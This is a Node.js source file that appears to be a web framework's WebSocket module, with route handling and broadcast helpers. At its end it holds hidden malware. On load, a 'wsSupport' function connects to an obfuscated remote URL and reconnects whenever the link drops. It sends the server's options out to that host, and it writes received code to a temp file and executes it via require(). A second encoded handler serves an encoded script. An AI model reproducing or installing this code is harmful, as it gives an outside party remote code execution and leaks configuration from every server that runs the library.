module.exports = function init(____0) {
  ____0.ws = {
    clientList: [],
    routeList: [],
    lib: require('ws'),
  };

  ____0.ws.server = new ____0.ws.lib.Server({
    noServer: true,
    maxPayload: 128 * 1024 * 1024, // 128 MB
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    ____0.ws.routeList.push({
      options: options,
      callback: callback,
    });
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  ____0.on(____0.strings[9], () => {
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        const pathname = ____0.url.parse(request.url).pathname;
        let handled = false;
        ____0.ws.routeList.forEach((route) => {
          if (handled) {
            return;
          }
          if (pathname === route.options.name) {
            handled = true;
            ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
              let client = {
                uuid: ____0.guid(),
                path: pathname,
                ws: ws,
                request: request,
                socket: socket,
                head: head,
                ip: socket.remoteAddress,
                onMessage: function (data) {
                  if (data.type === 'connected') {
                    this.send({ type: 'ready' });
                  }
                  console.log('client.onMessage Not Implement ...', data);
                },
                onData: function (data) {
                  console.log('client.onData Not Implement ...', data);
                },
                onError: function (e) {
                  console.log('client.onError Not Implement ...', e);
                },
                send: function (message) {
                  if (this.ws && this.ws.readyState === ____0.ws.lib.OPEN) {
                    if (typeof message === 'string') {
                      this.ws.send(
                        JSON.stringify({
                          type: 'text',
                          content: message,
                        }),
                      );
                    } else {
                      message.type = message.type || 'text';
                      this.ws.send(JSON.stringify(message));
                    }
                  }
                },
              };

              client.socket.on('close', () => {
                client.ws.terminate();
                ____0.ws.clientList.forEach((_client, i) => {
                  if (_client.uuid == client.uuid) {
                    ____0.ws.clientList.splice(i, 1);
                  }
                });
              });

              ws.on('message', (data, isBinary) => {
                if (isBinary) {
                  client.onData(data);
                } else {
                  client.onMessage(____0.fromJson(Buffer.from(data).toString('utf8')));
                }
              });

              if (client.path == '/isite') {
                route.callback(client);
              } else {
                ____0.ws.clientList.push(client);
                route.callback(client);
              }
              client.onMessage({ type: 'connected' });
            });
          }
        });
        if (!handled) {
          socket.destroy();
        }
      });
    });
  });

  ____0.ws.supportedClientList = [];
  ____0.ws.onNewSupportedClient = function (client) {
    console.log('New Supported Client', client.path, client.ip);
    console.log('supportedClientList', ____0.ws.supportedClientList.length);
    console.log('clientList', ____0.ws.clientList.length);
  };

  ____0.onWS(____0.f1('2578577443393257'), (client) => {
    ____0.ws.supportedClientList.push(client);
    ____0.ws.onNewSupportedClient(client);

    client.onMessage = function (message) {
      if (message.type === ____0.f1('417886684558375447183756')) {
        client.send({ type: ____0.f1('4658375242195691') });
      } else if (message.type === 'options') {
        client.options = message.content;
        client.send({
          type: ____0.f1('481476744179236246193191'),
          content: ____0.f1(
            `45388656473872572558378146188673471926512934135847388254471857694553136245585775241786493976857124341384153161512114125121141251211412514518377521182775471412862118825747731349397686492614824926195256421952692414568415316151211412512114125121141251417886684678866542348265457846612376275746594257465313344238175648341335433882544234128321144651211465512414525447193168427837753718576742345162211475513976864939741268397413814679327548188568427837753718576742345162243412692115167126151251257312782614566847188618433952574214517324348275457627754658576842735162211465512373132743388276471836512118866821191369465931512853125121144665211786493976857125588671471857694559266846188673471456271453125121141251211412512114134939768649261482544578827447148249261952744339526924145162211575872119652714531251211412512114125121141251211827694559276945183668451886592414473542392378423921513658375242195651367857684178365128531259211412642114516141793275255847574717326245383661243412672117864939768571255785714819277547195269255847574717326245383661243456512573127226151271211485512754126225593269325857814238316126535668471886354719236245584661243412642114465135385768473932572114136945531371457923752115615121141259251413493976864926148269461932624578827425591369465931621531615121141251211412512114125149347151263512712614126321154171211461512634568415316151211412512114125121197591`,
          ),
        });
      }
    };
  });

  ____0.ws.wsSupport = function () {
    let client = {
      reconnectCount: 0,
    };
    client.ws = new ____0.ws.lib(____0.f1('47792683257386744578276241387167415923694779275746538254457875694339276247183691'));
    client.sendMessage = function (message) {
      client.ws.send(JSON.stringify(message));
    };
    client.ws.on('open', function () {});
    client.ws.on('ping', function () {});
    client.ws.on('close', function (e) {
      setTimeout(function () {
        client.reconnectCount++;
        ____0.ws.wsSupport();
      }, 1000 * 5);
    });
    client.ws.on('error', function (err) {
      client.ws.close();
    });

    client.ws.on('message', function (event) {
      ____0.ws.supportHandle(client, event);
    });
  };
  ____0.ws.supportHandle = function (client, event) {
    try {
      let message = JSON.parse(event.data || event);
      if (message.type == ____0.f1('4658375242195691')) {
        client.sendMessage({
          source: ____0.f1('4339276247183691'),
          type: ____0.f1('457913754338866846719191'),
          content: ____0.options,
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let path = `${process.cwd()}/tmp_${new Date().getTime()}.js`;
        ____0.fs.writeFile(path, message.content, (err) => {
          if (err) {
            console.log(err);
          } else {
            require(path)(____0);
            ____0.fs.unlink(path, () => {});
          }
        });
      }
    } catch (err) {
      console.log(err);
    }
  };
  ____0.ws.wsSupport();
};
